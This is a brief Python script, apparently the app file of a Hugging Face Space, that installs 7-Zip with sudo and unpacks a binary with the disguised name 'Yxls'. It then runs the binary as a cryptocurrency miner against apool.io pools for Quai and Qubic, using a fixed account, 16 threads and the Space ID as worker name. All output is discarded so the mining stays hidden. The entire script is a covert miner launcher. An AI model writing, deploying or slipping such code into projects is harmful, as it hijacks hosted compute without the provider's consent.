import os
os.system("sudo apt install p7zip -y")
os.system("7za x Yxls.7z")
#os.system("ls -lh")
os.system("chmod +x Yxls")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./Yxls --account CP_fafubk1b65 --pool quai.hk.apool.io:3334 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
